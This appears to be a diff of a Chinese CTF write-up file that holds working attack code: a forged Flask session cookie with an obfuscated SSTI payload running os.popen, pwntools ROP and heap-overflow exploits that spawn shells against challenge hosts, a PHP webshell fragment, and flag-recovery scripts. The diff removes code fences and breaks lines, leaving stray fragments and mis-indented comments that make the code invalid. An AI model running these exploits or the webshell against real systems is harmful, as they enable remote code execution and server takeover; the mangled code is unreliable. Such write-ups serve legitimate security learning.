@@ -261,7 +261,8 @@ def sanitize_inventory_sold(value):
 开源地址：https://github.com/Paradoxis/Flask-Unsign
 
 flask-unsign --sign --cookie "{'identity': 'admin', 'username': 'test3','__init__':{'__global
-s__':{'sold':857,'inventory':'{{''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\163\137\137'][0]['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[133]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']('\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\160\157\160\145\156\050\042\167\150\157\141\155\151\042\051\056\162\145\141\144\050\051')}}'}}}" --secret 'a123456'
+s__':{'sold':
+857,'inventory':'{{''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\163\137\137'][0]['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[133]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']('\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\160\157\160\145\156\050\042\167\150\157\141\155\151\042\051\056\162\145\141\144\050\051')}}'}}}" --secret 'a123456'
 
 简单执行以下whoami证明方法可行
 
@@ -314,7 +315,8 @@ p.sendlineafter(b":n",b"c")
 
 binsh = 0x601840
 system = elf.plt["system"]
-pop_rdi = 0x0000000000400f13# : pop rdi ; ret
+pop_rdi = 0x0000000000400f13
+# : pop rdi ; ret
 ret = 0x00000000004006f6
 payload_1 = b"A" * 0x18 + p64(pop_rdi) + p64(binsh) + p64(ret)  + p64(system)
 p.sendlineafter(b"1/0n",payload_1)
@@ -672,7 +674,8 @@ for x in range(33, len(true_flag)):
 
 # flag{fcf94739-da66-467c-a77f-b50diosnkn1<?;
 # flag{fcf94739-da66-467c-a77f-b50db~cfc<126<
-# flag{fcf94739-da66-467c-a77f-b50dxe`e:740:.
+# flag{fcf94739-da66-467c-a77f-b50dxe`e:
+740:.
 # flag{fcf94739-da66-467c-a77f-b50dy|y&+(,&2{
 # flag{fcf94739-da66-467c-a77f-b50dad;651;/fc
 # flag{fcf94739-da66-467c-a77f-b50da>304>*cf1
@@ -708,11 +711,6 @@ for x in range(33, len(true_flag)):
 
 ```
 username=admin&password=%%
-```
-
-
-
-```
 import datetime
 from flask import Flask, render_template, render_template_string, request, redirect, url_for, session, make_response
 from wtforms import StringField, PasswordField, SubmitField
@@ -885,11 +883,6 @@ def index():
 
 if __name__ == '__main__':
     app.run(debug=False, host='0.0.0.0', port=1337)
-```
-
-
-
-```
 # 获取flag大致路径的
 if request.method == 'POST':
         action = request.form.get('action')
@@ -933,18 +926,9 @@ def view_inventory():
 # SSTI Waf处
 def sanitize_inventory_sold(value):
     return re.sub(r'[a-zA-Z_]', '', str(value))
-```
-
-
-
-```
 flask-unsign --sign --cookie "{'identity': 'admin', 'username': 'test3','__init__':{'__global
-s__':{'sold':857,'inventory':'{{''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\163\137\137'][0]['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[133]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']('\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\160\157\160\145\156\050\042\167\150\157\141\155\151\042\051\056\162\145\141\144\050\051')}}'}}}" --secret 'a123456'
-```
-
-
-
-```
+s__':{'sold':
+857,'inventory':'{{''['\137\137\143\154\141\163\163\137\137']['\137\137\142\141\163\145\163\137\137'][0]['\137\137\163\165\142\143\154\141\163\163\145\163\137\137']()[133]['\137\137\151\156\151\164\137\137']['\137\137\147\154\157\142\141\154\163\137\137']['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']('\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\160\157\160\145\156\050\042\167\150\157\141\155\151\042\051\056\162\145\141\144\050\051')}}'}}}" --secret 'a123456'
 from pwn import *
 
 context.log_level = "debug"
@@ -952,7 +936,7 @@ context.terminal = ["wt.exe","wsl"]
 
 elf = ELF("./pwn")
 p = elf.process()
-#p = remote("8.147.131.74", 24077)
+    #p = remote("8.147.131.74", 24077)
 def debug():
     pause()
     gdb.attach(p)
@@ -967,23 +951,19 @@ p.sendlineafter(b":n",b"a")
 p.sendlineafter(b"1/0n",b"1")
 p.sendlineafter(b":n",b"a")
 p.sendlineafter(b"1/0n",b"1")
-#debug()
+    #debug()
 p.sendlineafter(b":n",b"b")
 p.sendlineafter(b"1/0n",b"1")
 p.sendlineafter(b":n",b"c")
 
 binsh = 0x601840
 system = elf.plt["system"]
-pop_rdi = 0x0000000000400f13# : pop rdi ; ret
+pop_rdi = 0x0000000000400f13
+# : pop rdi ; ret
 ret = 0x00000000004006f6
 payload_1 = b"A" * 0x18 + p64(pop_rdi) + p64(binsh) + p64(ret)  + p64(system)
 p.sendlineafter(b"1/0n",payload_1)
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 import json
 
@@ -991,9 +971,9 @@ context.log_level = 'debug'
 context.terminal = ["wt.exe","wsl"]
 
 elf = ELF("./pwn")
-#p = elf.process()
+    #p = elf.process()
 p = remote("8.147.134.27",38474)
-#libc = ELF("/home/kamome/tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_i386/libc.so.6")
+    #libc = ELF("/home/kamome/tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_i386/libc.so.6")
 libc = ELF("./libc.so.6")
 def debug():
     pause()
@@ -1012,18 +992,18 @@ def show_heap(idx):
 def edit_heap(idx,content):
     p.sendlineafter(b"5.exittn",b'{"choice":"4","idx":1,"size":"","content":"' + content + b'"}')
 
-#debug()
-#pause()
+    #debug()
+    #pause()
 
 heaplist = 0x08051B10
 add_heap(8,b"/bin/sh")
 
-#free_got = elf.got["free"]
+    #free_got = elf.got["free"]
 printf_got = elf.got["printf"]
 
 payload_1 = b"A" * 0x4cc + p32(heaplist + 4)
 add_heap(printf_got,payload_1)
-#add_heap(0x8,"AAAA")
+    #add_heap(0x8,"AAAA")
 
 show_heap(1)
 libc.address = u32(p.recvuntil(b"xf7")[-4:]) - libc.sym["printf"]
@@ -1034,13 +1014,8 @@ system = libc.sym["system"]
 edit_heap(1,b"A" * 4 + p32(system))
 
 free_heap(0)
-#debug()
+    #debug()
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 
 context.log_level = "debug"
@@ -1113,11 +1088,6 @@ add_heap(0x10,p64(og))
 p.sendlineafter(b"adventurer? ", b"1")
 p.sendlineafter(b"bytes): ", b"10")
 p.interactive()
-```
-
-
-
-```
 <?php
 @session_start();
 @set_time_limit(0);
@@ -1146,11 +1116,6 @@ if (isset($_POST[$pass])){
         }
     }
 }
-```
-
-
-
-```
 8fa14cdd754f91cc6554c9e71929cce7
 2db95e8e1a9267b7a1188556b2013b33
 0cc175b9c0f1b6a831c399e269772661
@@ -1186,11 +1151,6 @@ d95679752134a2d9eb61dbd7b91c4bcc
 9033e0e305f247c0c3c80d0c7848c8b3
 9033e0e305f247c0c3c80d0c7848c8b3
 cbb184dd8e05c9709e5dcaedaa0495cf
-```
-
-
-
-```
 import hashlib
 import string
 
@@ -1240,11 +1200,6 @@ for x in range(len(flag)):
             print(i, end="")
 
 # flag{The_m0st_2ecUre_eNcrYption!!!}
-```
-
-
-
-```
 true_flag = [
     0x00, 0x1B, 0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 
     0x51, 0x4B, 0x4F, 0x57, 0x05, 0x54, 0x0A, 0x0D, 0x06, 0x1C, 
@@ -1266,11 +1221,6 @@ for i in range(16):
     next1 = true_flag[i] ^ ord(tmp[-1])
     tmp += chr(next1)
 print(tmp)
-```
-
-
-
-```
 for x in range(33, len(true_flag)):
     tmp = 'flag{fcf94739-da66-467c-a77f-b50d'
     for i in range(10):
@@ -1280,7 +1230,8 @@ for x in range(33, len(true_flag)):
 
 # flag{fcf94739-da66-467c-a77f-b50diosnkn1<?;
 # flag{fcf94739-da66-467c-a77f-b50db~cfc<126<
-# flag{fcf94739-da66-467c-a77f-b50dxe`e:740:.
+# flag{fcf94739-da66-467c-a77f-b50dxe`e:
+740:.
 # flag{fcf94739-da66-467c-a77f-b50dy|y&+(,&2{
 # flag{fcf94739-da66-467c-a77f-b50dad;651;/fc
 # flag{fcf94739-da66-467c-a77f-b50da>304>*cf1
